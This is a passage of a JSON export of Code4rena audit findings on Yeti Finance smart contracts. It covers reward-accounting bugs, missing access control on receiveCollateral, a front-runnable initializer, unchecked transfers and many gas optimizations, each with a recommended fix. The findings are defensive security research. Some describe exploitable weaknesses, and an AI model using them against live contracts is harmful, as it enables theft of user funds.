`sendCollateralsUnwrap` to first send the updated rewards and then unwrap the asset. You can also consider adding to the beginning of `unwrapFor` a call to `_userUpdate(_to, 0, true)` to make sure the rewards are updated before unwrapping. Note: as user can choose to have JOE rewards accrue to a different address than the address that uses WJLP as collateral, you'll have to make sure you update the current accounts. I'll detail this in another issue.  "}, {"title": "Gas saving", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/148", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-yetifinance-findings", "body": "# Handle  0x1f8b   # Vulnerability details  ## Impact Gas saving.  ## Proof of Concept Moving the substraction inside the if condition in `TimeswapPair.withdraw` could be avoided the zero substraction.  ## Tools Used Manual review.  ## Recommended Mitigation Steps Change: ``` pool.state.reserves.asset -= tokensOut.asset;         pool.state.reserves.collateral -= tokensOut.collateral;          if (tokensOut.asset > 0) asset.safeTransfer(assetTo, tokensOut.asset);         if (tokensOut.collateral > 0) collateral.safeTransfer(collateralTo, tokensOut.collateral);. ``` to ```         if (tokensOut.asset > 0) { pool.state.reserves.asset -= tokensOut.asset; asset.safeTransfer(assetTo, tokensOut.asset); }         if (tokensOut.collateral > 0) { pool.state.reserves.collateral -= tokensOut.collateral; collateral.safeTransfer(collateralTo, tokensOut.collateral);. } ```  "}, {"title": "Unwhitelisted token can cause disaster", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/146", "labels": ["bug", "2 (Med Risk)", "sponsor disputed"], "target": "2021-12-yetifinance-findings", "body": "Unwhitelisted token can cause disaster"}, {"title": "Target pool does not get updated due to receiveCollateral not being called", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/145", "labels": ["bug", "1 (Low Risk)", "sponsor disputed"], "target": "2021-12-yetifinance-findings", "body": "Target pool does not get updated due to receiveCollateral not being called"}, {"title": "Deprecated collateral check is missing in sendCollaterals", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/144", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-12-yetifinance-findings", "body": "Deprecated collateral check is missing in sendCollaterals"}, {"title": "Gas savings: Require statement is not needed", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/143", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-yetifinance-findings", "body": "Gas savings: Require statement is not needed"}, {"title": "WJLP loses unclaimed rewards when updating user's rewards", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/141", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  kenzo   # Vulnerability details  After updating user's rewards in `_userUpdate`, if the user has not claimed them, and `_userUpdate` is called again (eg. on another `wrap`), the user's unclaimed rewards will lose the previous unclaimed due to wrong calculation.  ## Impact Loss of yield for user.  ## Proof of Concept When updating the user's unclaimedJoeReward, the function doesn't save it's previous value. [(Code ref)](https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L251:#L253) ```         if (user.amount > 0) {             user.unclaimedJOEReward = user.amount.mul(accJoePerShare).div(1e12).sub(user.rewardDebt);         }         if (_isDeposit) {             user.amount = user.amount.add(_amount);         } else {             user.amount = user.amount.sub(_amount);         }         // update for JOE rewards that are already accounted for in user.unclaimedJOEReward         user.rewardDebt = user.amount.mul(accJoePerShare).div(1e12); ``` So for example, rewards can be lost in the following scenario. We'll mark \"acc1\" for the value of \"accJoePerShare\" at step 1. 1. User Zebulun wraps 100 tokens. After  `_userUpdate` is called: unclaimedJOEReward  = 0, rewardDebt = 100*acc1. 2. Zebulun wraps 50 tokens: unclaimedJOEReward = 100*acc2 - 100*acc1, rewardDebt = 150 * acc2. 3. Zebulun wraps 1 token: unclaimedJOEReward = 150*acc3 - 150*acc2, rewardDebt = 151*acc3 So in the last step, Zebulun's rewards only take into account the change in accJoePerShare in steps 2-3, and lost the unclaimed rewards from steps 1-2.  ## Recommended Mitigation Steps Change the unclaimed rewards calculation to: ``` user.unclaimedJOEReward = user.unclaimedJOEReward.add(user.amount.mul(accJoePerShare).div(1e12).sub(user.rewardDebt)); ```  "}, {"title": "Gas savings", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/139", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  csanuragjain   # Vulnerability details  ## Impact Gas savings  ## Proof of Concept  1. Navigate to contract at https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/LimboDAO.sol  2. Observe that in burnAsset function, fateCreated can be initialized with 0 instead of fateState[_msgSender()].fateBalance which takes more gas. Actual value of fateCreated is decided by if-else condition  3. Observe that in vote function isLive modifier should be before incrementFate as if contract is not live then there is no meaning of incrementFate  4. Observe that in vote function below nested condition can be placed beforehand as if this happens further execution is not required  ``` if (block.timestamp - currentProposalState.start > proposalConfig.votingDuration) ```  5. Observe that previousProposalState is never used and can be removed  "}, {"title": "Unused WJLP can't be simply unwrapped", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/138", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  kenzo   # Vulnerability details  WJLP can only be unwrapped from the Active Pool or Stability Pool. A user who decided to wrap his JLP, but not use all of them in a trove, Wouldn't be able to just unwrap them.  ## Impact Impaired functionality for users. Would have to incur fees for simple unwrapping.  ## Proof of Concept The unwrap functionality is only available from `unwrapFor` function, and that function is only callable from AP or SP. [(Code ref)](https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L148:#L149) ``` function unwrapFor(address _to, uint _amount) external override {         _requireCallerIsAPorSP(); ```  ## Recommended Mitigation Steps Allow anybody to call the function. As it will burn the holder's WJLP, a user could only unwrap tokens that are not in use.  "}, {"title": "Reward not transferred correctly", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/137", "labels": ["bug", "2 (Med Risk)", "disagree with severity"], "target": "2021-12-yetifinance-findings", "body": "Reward not transferred correctly"}, {"title": "WJLP will continue accruing rewards after user has unwrapped his tokens", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/136", "labels": ["bug", "3 (High Risk)", "disagree with severity", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  kenzo   # Vulnerability details  WJLP doesn't update the inner accounting (for JOE rewards) when unwrapping user's tokens. The user will continue to receive rewards, on the expanse of users who haven't claimed their rewards yet.  ## Impact Loss of yield for users.  ## Proof of Concept The unwrap function just withdraws JLP from MasterChefJoe, burns the user's WJLP, and sends the JLP back to the user. It does not update the inner accounting (`userInfo`). [(Code ref)](https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L148:#L167) ```     function unwrapFor(address _to, uint _amount) external override {         _requireCallerIsAPorSP();         _MasterChefJoe.withdraw(_poolPid, _amount);         // msg.sender is either Active Pool or Stability Pool         // each one has the ability to unwrap and burn WAssets they own and         // send them to someone else         _burn(msg.sender, _amount);         JLP.transfer(_to, _amount);     } ```  ## Recommended Mitigation Steps Need to keep userInfo updated. Have to take into consideration the fact that user can choose to set the reward claiming address to be a different account than the one that holds the WJLP.  "}, {"title": "Gas saving in ShortLockupContract", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/133", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  0x1f8b   # Vulnerability details  ## Impact Gas saving.  ## Proof of Concept The variables `yetiToken` and `unlockTime` inside the `ShortLockupContract` contract are never modified, so it's better to use immutable to avoid storage access.  ## Tools Used Gas saving  ## Recommended Mitigation Steps Use immutable  "}, {"title": "Use immutable", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/132", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  0x1f8b   # Vulnerability details  ## Impact Gas saving.  ## Proof of Concept The variable `yetiToken` inside the `LockupContract` contract is never modified, so it's better to use immutable to avoid storage access.  ## Tools Used Gas saving  ## Recommended Mitigation Steps Use immutable  "}, {"title": "Less than 256 uints are not gas efficient", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/123", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-yetifinance-findings", "body": "Less than 256 uints are not gas efficient"}, {"title": "Yeti token rebase checks the additional token amount incorrectly", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/121", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  hyh   # Vulnerability details  # Impact  The condition isn't checked now as the whole balance is used instead of the Yeti tokens bought back from the market. As it's not checked, the amount added to `effectiveYetiTokenBalance` during rebase can exceed the actual amount of the Yeti tokens owned by the contract. As the before check amount is calculated as the contract net worth, it can be fixed by immediate buy back, but it will not be the case.  The deficit of Yeti tokens can materialize in net worth terms as well if Yeti tokens price will raise compared to the last used one. In this case users will be cumulatively accounted with the amount of tokens that cannot be actually withdrawn from the contract, as its net holdings will be less then total users\u2019 claims. In other words, the contract will be in default if enough users claim after that.  ## Proof of Concept  Now the whole balance amount is used instead of the amount bought back from market.  Rebasing amount is added to `effectiveYetiTokenBalance`, so it should be limited by extra Yeti tokens, not the whole balance: https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/YETI/sYETIToken.sol#L247  ## Recommended Mitigation Steps  It looks like only extra tokens should be used for the check, i.e. `yetiToken.balance - effectiveYetiTokenBalance`.  Now: ``` function rebase() external {   ...   uint256 yetiTokenBalance = yetiToken.balanceOf(address(this));   uint256 valueOfContract = _getValueOfContract(yetiTokenBalance);   uint256 additionalYetiTokenBalance = ...   if (yetiTokenBalance < additionalYetiTokenBalance) {     additionalYetiTokenBalance = yetiTokenBalance;   }   effectiveYetiTokenBalance = effectiveYetiTokenBalance.add(additionalYetiTokenBalance); ... function _getValueOfContract(uint _yetiTokenBalance) internal view returns (uint256) {   uint256 adjustedYetiTokenBalance = _yetiTokenBalance.sub(effectiveYetiTokenBalance);   uint256 yusdTokenBalance = yusdToken.balanceOf(address(this));   return div(lastBuybackPrice.mul(adjustedYetiTokenBalance), (1e18)).add(yusdTokenBalance); } ```  As the `_getValueOfContract` function isn't used elsewhere, the logic can be simplified. To be: ``` function rebase() external {   ...   uint256 adjustedYetiTokenBalance = (yetiToken.balanceOf(address(this))).sub(effectiveYetiTokenBalance);   uint256 valueOfContract = _getValueOfContract(adjustedYetiTokenBalance);   uint256 additionalYetiTokenBalance = ...   if (additionalYetiTokenBalance > adjustedYetiTokenBalance) {     additionalYetiTokenBalance = adjustedYetiTokenBalance;   }   effectiveYetiTokenBalance = effectiveYetiTokenBalance.add(additionalYetiTokenBalance); ... function _getValueOfContract(uint _adjustedYetiTokenBalance) internal view returns (uint256) {   uint256 yusdTokenBalance = yusdToken.balanceOf(address(this));   return div(lastBuybackPrice.mul(_adjustedYetiTokenBalance), (1e18)).add(yusdTokenBalance); } ```   "}, {"title": "BorrowerOperations and StabilityPool trove status check depends on the enumeration order", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/120", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  hyh   # Vulnerability details  # Impact  Core system logic can break up if enumeration structure be updated.  ## Proof of Concept  BorrowerOperations and StabilityPool check the active status of a trove by comparing TroveManager's getTroveStatus with 1: BorrowerOperations: https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L902 https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L907 StabilityPool: https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/StabilityPool.sol#L1104  TroveManagers inherit Status enumeration from TroveManagerBase: https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/Dependencies/TroveManagerBase.sol#L72  ## Recommended Mitigation Steps  With further system development it will be harder to track fixes needed on enumeration change. Consider implementing TroveManager.isTroveActive(borrower) where trove.status is checked against Status.active and the corresponding boolean is returned.   "}, {"title": "WJLP contract doesn't check for JOE and JLP token transfers success", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/107", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  hyh   # Vulnerability details  # Impact  Transactions will not be reverted on failed transfer call, setting system state as if it was successful. This will lead to wrong state accounting down the road with a wide spectrum of possible consequences.  ## Proof of Concept  _safeJoeTransfer do not check for JOE.transfer call success: https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L268  _safeJoeTransfer is called by _sendJoeReward, which is used in reward claiming.  JOE token use transfer from OpenZeppelin ERC20: https://github.com/traderjoe-xyz/joe-core/blob/main/contracts/JoeToken.sol#L9  Which does return success code: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L113  Trader Joe also uses checked transfer when dealing with JOE tokens: https://github.com/traderjoe-xyz/joe-core/blob/main/contracts/MasterChefJoeV3.sol#L102   Also, unwrapFor do not check for JLP.transfer call success: https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L166   ## Recommended Mitigation Steps  Add a require() check for the success of JOE transfer in _safeJoeTransfer function and create and use a similar function with the same check for JLP token transfers  "}, {"title": "Debug code left over in WJLP.unwrapFor", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/106", "labels": ["bug", "disagree with severity", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  hyh   # Vulnerability details  Console log code to be removed: https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L152  "}, {"title": "WJLP setAddresses initialization can be front run", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/105", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  hyh   # Vulnerability details  # Impact  WJLP set configuration variables via setAddresses initialize function that has no access controls, so whenever it is being run not atomically with contract creation it can be front run by an attacker. The fix is to redeploy the contracts.  ## Proof of Concept  WJLP.setAddresses: https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L102  WJLP.constructor: https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L82  ## Recommended Mitigation Steps  a. Either set access rights in the constructor and restrict initialize access b. Or run setAddresses atomically along with contract construction each time  It is also advised to check for zero addressed supplied by a caller both in constructor and setAddresses. Misconfiguration with zero address also leads to redeployment.  "}, {"title": "Checking zero address on msg.sender is impractical", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/103", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  dalgarim   # Vulnerability details  ## Impact sYETIToken.sol mint function checks if msg.sender is zero address. It is extremely unlikely that someone possesses a private key of zero address. This 'require' statement semantically has no meaning  ## Proof of Concept [mint](https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/YETI/sYETIToken.sol#L175) ``` function mint(uint256 amount) public returns (bool) {         require(msg.sender != address(0), \"Zero address\");         User memory user = users[msg.sender];          uint256 shares = totalSupply == 0 ? amount : (amount * totalSupply) / effectiveYetiTokenBalance;         user.balance += shares.to128();         user.lockedUntil = (block.timestamp + LOCK_TIME).to128();         users[msg.sender] = user;         totalSupply += shares;          yetiToken.sendToSYETI(msg.sender, amount);         effectiveYetiTokenBalance = effectiveYetiTokenBalance.add(amount);          emit Transfer(address(0), msg.sender, shares);         return true;     } ```  ## Tools Used Manual  ## Recommended Mitigation Steps The require statement can be removed  "}, {"title": "uint is always >= 0", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/102", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "uint is always >= 0"}, {"title": "sYETIToken rebase comment should be 'added is not more than repurchased'", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/100", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  hyh   # Vulnerability details  # Impact  Comment is misleading, now stating the opposite of the implemented logic.  ## Proof of Concept  Comment states that tokens added are `not less than amount repurchased`, while it should be `not more`: https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/YETI/sYETIToken.sol#L246   ## Recommended Mitigation Steps  Now: ``` // Ensure that the amount of YETI tokens effectively added is >= the amount we have repurchased. if (yetiTokenBalance < additionalYetiTokenBalance) {   additionalYetiTokenBalance = yetiTokenBalance; } ```  To be: ``` // Ensure that the amount of YETI tokens effectively added is <= the amount we have repurchased. if (yetiTokenBalance < additionalYetiTokenBalance) {   additionalYetiTokenBalance = yetiTokenBalance; } ```  "}, {"title": "BorrowerOperations has unused pieces of functionality", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/99", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  hyh   # Vulnerability details  ## Proof of Concept  _requireValidRouterParams and _requireRouterAVAXIndicesInOrder functions along with IYetiRouter interface are unused:  _requireValidRouterParams https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1053  _requireRouterAVAXIndicesInOrder https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L1067  IYetiRouter import and the interface itself: https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L12 https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/Interfaces/IYetiRouter.sol  ## Recommended Mitigation Steps  If it is not meant to be implemented further consider removal to enhance code readability and size  "}, {"title": "User facing BorrowerOperations and TroveManager miss emergency lever", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/97", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-yetifinance-findings", "body": "User facing BorrowerOperations and TroveManager miss emergency lever"}, {"title": "BorrowerOperations.withdrawColl doesn't check the length of the caller supplied arrays", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/96", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  hyh   # Vulnerability details  # Impact  On calling with arrays of different lengths various malfunctions are possible as the arrays are used as given. `withdrawColl` outcome will not be as expected by a caller.  ## Proof of Concept  `_adjustTrove` doesn't check for array lengths and all other array providing usages of this function do check them before usage.  BorrowerOperations.withdrawColl doesn't: https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L373  ## Recommended Mitigation Steps  Add the check:  Now: ``` params._collsOut = _collsOut; params._amountsOut = _amountsOut; ```  To be: ``` require(_collsOut.length == _amountsOut.length); params._collsOut = _collsOut; params._amountsOut = _amountsOut; ```   "}, {"title": "Consider making some constants as non-public to save gas", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/95", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "Consider making some constants as non-public to save gas"}, {"title": "Use safeTransfer/safeTransferFrom consistently instead of transfer/transferFrom", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/94", "labels": ["bug", "1 (Low Risk)"], "target": "2021-12-yetifinance-findings", "body": "Use safeTransfer/safeTransferFrom consistently instead of transfer/transferFrom"}, {"title": "SHOULD CHECK RETURN DATA FROM CHAINLINK AGGREGATORS", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/91", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "SHOULD CHECK RETURN DATA FROM CHAINLINK AGGREGATORS"}, {"title": "Delete - ABI Coder V2 For Gas Optimization", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/89", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  defsec   # Vulnerability details  ## Impact  From Pragma 0.8.0, ABI coder v2 is activated by default. The pragma abicoder v2 can be deleted from the repository. That will provide gas optimization.  ## Proof of Concept  1. The following contract is using ABI coder v2.  \"https://github.com/code-423n4/2021-12-yetifinance/blob/1da782328ce4067f9654c3594a34014b0329130a/packages/contracts/contracts/YETI/sYETIToken.sol#L3\"   ## Tools Used  None  ## Recommended Mitigation Steps  Upgrade pragma to 0.8.0  and After the 0.8.0, ABI coder v2 is activated by default. Upgrade pragma to 0.8.0 version. It is recommended to delete redundant codes.  From Solidity v0.8.0 Breaking Changes https://docs.soliditylang.org/en/v0.8.0/080-breaking-changes.html  "}, {"title": "A variable is being assigned its default value which is unnecessary.", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/87", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact Removing the assignment will save gas. ``` _totalSupply = 0; ```  ## Proof of Concept https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L93  ## Tools Used  ## Recommended Mitigation Steps Remove the assignment.  "}, {"title": "Unipool's and Pool2Unipool's setParams can be run repeatedly", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/86", "labels": ["bug", "1 (Low Risk)", "sponsor disputed"], "target": "2021-12-yetifinance-findings", "body": "Unipool's and Pool2Unipool's setParams can be run repeatedly"}, {"title": "Unnecessary use of Safemath", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/85", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact ``` deploymentTime = block.timestamp; uint public constant BOOTSTRAP_PERIOD = 14 days;  deploymentTime.add(BOOTSTRAP_PERIOD) // doesn't overflow  ```  ## Proof of Concept https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/BorrowerOperations.sol#L899  ## Tools Used Remix ## Recommended Mitigation Steps I recommend   not  use Safemath for this operation.  "}, {"title": "Missing events in critical functions", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/84", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  SolidityScan   # Vulnerability details  ## Impact Events are important and should be emitted for tracking this off-chain for all important functions.   ## Proof of Concept 1. The function \"updateTeamAddress\" is used to update the team's address but we can notice no event is emitted.  https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/TeamAllocation.sol#L81-L83  2. The same in function \"updateTeamWallet\" at  https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/YetiFinanceTreasury.sol#L28-L30  ## Tools Used  ## Recommended Mitigation Steps Add an event to these important functions where address updation is happening. This can also be marked as indexed event for better off-chain tracking  "}, {"title": "Upgrading the solc compiler to >=0.8 may save gas ", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/81", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-yetifinance-findings", "body": "Upgrading the solc compiler to >=0.8 may save gas "}, {"title": "Avoid unnecessary storage read can save gas", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/79", "labels": ["bug", "G (Gas Optimization)"], "target": "2021-12-yetifinance-findings", "body": "Avoid unnecessary storage read can save gas"}, {"title": "TellorCaller.sol constructor does not guard against zero address", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/78", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  jayjonah8   # Vulnerability details  ## Impact the constructor in TellorCaller.sol should ensure that the _tellorMasterAddress arg passed in is not a zero address as a safegaurd.  ## Proof of Concept https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/Dependencies/TellorCaller.sol#L24  ## Tools Used Manual code review   ## Recommended Mitigation Steps require(address(_tellorMasterAddress) != address(0), \"Zero address\")  "}, {"title": "sendAllocatedYETI() can be called by anyone", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/75", "labels": ["bug", "invalid", "3 (High Risk)", "sponsor disputed"], "target": "2021-12-yetifinance-findings", "body": "sendAllocatedYETI() can be called by anyone"}, {"title": "receiveCollateral() can be called by anyone", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/74", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  jayjonah8   # Vulnerability details  ## Impact In StabilityPool.sol, the receiveCollateral() function should be called by ActivePool per comments,  but anyone can call it passing in _tokens and _amounts args to update stability pool balances.   ## Proof of Concept https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/StabilityPool.sol#L1143  ## Tools Used Manual code review   ## Recommended Mitigation Steps Allow only the ActivePool to call the receiveCollateral() function: require(msg.sender = address(active pool address), \"Can only be called by ActivePool\")  "}, {"title": "Useless imports", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/72", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "Useless imports"}, {"title": "Remove GasPool.sol since its not needed ", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/71", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed"], "target": "2021-12-yetifinance-findings", "body": "Remove GasPool.sol since its not needed "}, {"title": "Caching variables", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/70", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "Caching variables"}, {"title": "Wrapped Joe LP token Contract  JLP token variable is set on initialization, doesn't change afterwards and should be immutable", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/69", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact ``` IERC20 public immutable JLP; IERC20 public  immutable JOE; ```  ## Proof of Concept https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/AssetWrappers/WJLP/WJLP.sol#L41-L44  ## Tools Used REmix ## Recommended Mitigation Steps  "}, {"title": "Consider removing BaseBoringBatchable.sol", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/68", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-yetifinance-findings", "body": "Consider removing BaseBoringBatchable.sol"}, {"title": "Long Revert Strings", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/66", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2021-12-yetifinance-findings", "body": "Long Revert Strings"}, {"title": "Use of Large Number Literals", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/64", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  SolidityScan   # Vulnerability details  ### Description  Integer literals are formed from a sequence of digits in the range 0-9. They are interpreted as decimals. The use of very large numbers with too many digits was detected in the code that could have been optimized using a different notation also supported by Solidity.  ## Impact Literals with many digits are difficult to read and review. This may also introduce errors in the future if one of the zeroes is omitted while doing code modifications.   ## Proof of Concept 1.  uint constant public _100pct = 1000000000000000000;  https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/Dependencies/LiquityBase.sol#L19  2. uint constant public _110pct = 1100000000000000000; // 1.1e18 == 110%  https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/Dependencies/LiquityBase.sol#L21  3. uint constant public MCR = 1100000000000000000; // 110%  https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/Dependencies/LiquityBase.sol#L24  4. uint constant public CCR = 1500000000000000000; // 150% https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/Dependencies/LiquityBase.sol#L27  ## Tools Used  ## Recommended Mitigation Steps Scientific notation in the form of\u00a02e10\u00a0is also supported, where the mantissa can be fractional but the exponent has to be an integer. The literal\u00a0MeE\u00a0is equivalent to\u00a0M\u00a0*\u00a010**E. Examples include\u00a02e10,\u00a02e10,\u00a02e-10,\u00a02.5e1. As suggested in official docs https://docs.soliditylang.org/en/latest/types.html#rational-and-integer-literals  "}, {"title": "Unused functions can be removed to save gas", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/63", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  SolidityScan   # Vulnerability details  ### Description  Smart Contracts are Gas sensitive and heavily depend on how Gas is spent and managed across the code. This affects each and every function definition and logic.   Therefore having any unused functions in the code cost unnecessary Gas usage and thus negatively impacts the 